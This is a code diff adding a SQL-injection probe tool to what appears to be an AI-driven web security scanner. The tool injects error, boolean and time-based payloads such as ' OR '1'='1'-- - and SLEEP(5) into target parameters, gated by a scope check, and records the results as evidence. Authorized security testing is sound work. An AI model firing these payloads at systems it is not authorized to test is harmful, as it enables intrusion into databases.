@@ -115,7 +115,7 @@ export interface PilotSession {
 export const STAGE_TOOLS = {
   survey: ["browser_navigate", "browser_fill", "browser_click", "login", "probe_paths", "ignore_paths", "survey_status", "survey_done"],
   methodology: ["get_inventory", "record_methodology", "methodology_done"],
-  diagnose: ["get_screen", "login", "http_request", "probe_params", "probe_xss", "probe_dom_xss", "probe_stored_xss", "probe_ssti", "probe_redirect", "probe_jwt", "probe_csrf", "probe_oob", "probe_logic", "analyze_session", "verify_access", "browser_navigate", "browser_fill", "browser_click", "browser_upload", "record_finding", "screen_done"],
+  diagnose: ["get_screen", "login", "http_request", "probe_params", "probe_xss", "probe_dom_xss", "probe_stored_xss", "probe_ssti", "probe_sqli", "probe_redirect", "probe_jwt", "probe_csrf", "probe_oob", "probe_logic", "analyze_session", "verify_access", "browser_navigate", "browser_fill", "browser_click", "browser_upload", "record_finding", "screen_done"],
   // シナリオ(A04 横断ロジック): inventory 俯瞰 + 多段リクエスト連鎖を probe_scenario で撃つ。画面診断の後に1回。
   scenario: ["get_inventory", "login", "http_request", "probe_scenario", "record_finding", "scenario_done"],
   // フィンガープリント(A06 既知脆弱コンポーネント): fingerprint_scan で版を集め、(opt-in で cve_lookup)既知 CVE を評価して記録。
@@ -1299,6 +1299,91 @@ export function buildTools(s: PilotSession) {
                 : `not confirmed: ${(verdict as { reason: string }).reason}`,
           }),
         );
+      },
+    ),
+    tool(
+      "probe_sqli",
+      "Confirm SQL INJECTION — boolean-based (in-band) AND time-based (BLIND). Inject into `param` (query) or a `body` containing {{SQLI}}. Runs: an error probe (a lone quote → SQL-error signature), a boolean pair (TRUE vs FALSE — a stable content DIFFERENCE = injection), and a time-based test (SLEEP(5)/pg_sleep(5)/WAITFOR — a consistent ~5s DELAY vs a fast baseline = blind injection; MySQL/Postgres/MSSQL tried). Returns negativeControl + positiveReplays evidenceIds + the confirming technique, ready for record_finding(category sqli). USE on any value reaching a query: search/id/sort/filter/login. (An error signature alone is a HINT — confirm with boolean or time.)",
+      { url: z.string(), param: z.string().optional(), method: z.string().optional(), body: z.string().optional() },
+      async ({ url, param, method, body }) => {
+        const buildReq = (val: string): HttpRequest | null => {
+          let u = url;
+          let b: string | null = null;
+          if (body != null) b = body.replace(/\{\{SQLI\}\}/g, val);
+          else if (param) {
+            try {
+              const uu = new URL(url);
+              uu.searchParams.set(param, val);
+              u = uu.toString();
+            } catch {
+              return null;
+            }
+          }
+          if (!isInScope(u, s.scope)) return null;
+          return { method: (method ?? (body != null ? "POST" : "GET")).toUpperCase(), url: u, headers: authHeaders(s), body: b };
+        };
+        const send = async (val: string, kind: "negative_control" | "positive_replay", tag: string, overrideBody?: string) => {
+          const req = buildReq(val);
+          if (!req) return null;
+          const res = await s.http.send(req);
+          bumpHttp(s, res.status);
+          const ev = s.evidence.record({
+            screenId: s.currentScreenId ?? "pilot",
+            validator: "claude-pilot-sqli",
+            kind,
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            response: overrideBody != null ? { ...res, body: overrideBody } : res,
+            note: `sqli ${tag}`,
+          });
+          return { evId: ev.id, status: res.status, len: res.body.length, ms: res.durationMs, body: res.body };
+        };
+        try {
+          const benign = await send("1", "negative_control", "baseline(benign)");
+          if (!benign) return txt("ERROR: bad url/param — pass url+param or a body with {{SQLI}}.");
+          // ── error-based(ヒント) ──
+          const SQL_ERR = /sql syntax|you have an error in your sql|warning:\s*mysql|ORA-\d{3,}|PostgreSQL.*ERROR|SQLite3?::|ODBC[^;]*SQL|unclosed quotation|quoted string not properly terminated|SQLSTATE\[/i;
+          const err = await send("'", "positive_replay", "error-probe(quote)");
+          const errSig = err ? SQL_ERR.exec(err.body)?.[0] : undefined;
+          // ── boolean-based(in-band 差分) ──
+          const falseR = await send("' OR '1'='2'-- -", "negative_control", "boolean FALSE");
+          for (const tp of ["' OR '1'='1'-- -", " OR 1=1-- -", "') OR ('1'='1"]) {
+            const t1 = await send(tp, "positive_replay", `boolean TRUE ${tp}`);
+            if (!t1 || !falseR) continue;
+            const diff = (x: { status: number; len: number }): boolean => x.status !== falseR.status || Math.abs(x.len - falseR.len) > 64;
+            if (t1.status < 500 && diff(t1)) {
+              const t2 = await send(tp, "positive_replay", `boolean TRUE#2 ${tp}`);
+              if (t2 && diff(t2) && Math.abs(t2.len - t1.len) <= 64)
+                return txt(JSON.stringify({ technique: "boolean", negativeControl: falseR.evId, positiveReplays: [t1.evId, t2.evId], verdict: `SQLi CONFIRMED (boolean): TRUE(${tp}) len ${t1.len}/${t2.len} vs FALSE len ${falseR.len}. record_finding(category sqli) with these evidenceIds.${errSig ? ` (SQL error also seen: ${errSig})` : ""}` }));
+            }
+          }
+          // ── time-based(blind: 一定の遅延) ──
+          const baselineMs = Math.min(benign.ms, (await send("1", "negative_control", "baseline#2"))?.ms ?? benign.ms);
+          for (const sp of ["' AND SLEEP(5)-- -", " AND SLEEP(5)-- -", "' AND pg_sleep(5)-- -", "'; WAITFOR DELAY '0:0:5'-- -", "' OR SLEEP(5)-- -"]) {
+            const a = await send(sp, "positive_replay", `time ${sp}`);
+            if (!a || a.ms < baselineMs + 4000) continue;
+            const b2 = await send(sp, "positive_replay", `time#2 ${sp}`);
+            if (b2 && b2.ms >= baselineMs + 4000) {
+              // blind = 内容不変 → record_finding の length gate 用に timing-proof を distinguishable な evidence body で残す。
+              const proof = `TIME-BASED BLIND SQLi CONFIRMED — payload="${sp}" baseline=${baselineMs}ms observed=${a.ms}ms and ${b2.ms}ms (delta +${a.ms - baselineMs}ms, x2 stable). Blind injection: response content is unchanged, the DELAY is the proof.`;
+              const p1 = await send(sp, "positive_replay", "time-proof#1", proof);
+              const p2 = await send(sp, "positive_replay", "time-proof#2", proof);
+              const ctl = await send("1", "negative_control", "time baseline-proof", `baseline ${baselineMs}ms — no injection, fast response.`);
+              if (p1 && p2 && ctl)
+                return txt(JSON.stringify({ technique: "time-based", negativeControl: ctl.evId, positiveReplays: [p1.evId, p2.evId], verdict: `BLIND SQLi CONFIRMED (time-based): SLEEP(5) added ~${a.ms - baselineMs}ms x2 vs ${baselineMs}ms baseline (payload ${sp}). record_finding(category sqli, high+) with these evidenceIds.` }));
+            }
+          }
+          return txt(
+            JSON.stringify({
+              technique: null,
+              errorSignature: errSig ?? null,
+              verdict: errSig
+                ? `SQL error signature seen ("${errSig}") but boolean/time did not confirm — likely SQLi behind a filter; try tailored payloads via http_request (different quote/comment styles, UNION, or the login-bypass oracle on auth screens).`
+                : "not confirmed: no boolean content-difference and no time delay. If this is a login form, test auth-bypass (success = a session/redirect, not an error).",
+            }),
+          );
+        } catch (e) {
+          return txt(`ERROR: ${String(e).slice(0, 180)}`);
+        }
       },
     ),
     tool(
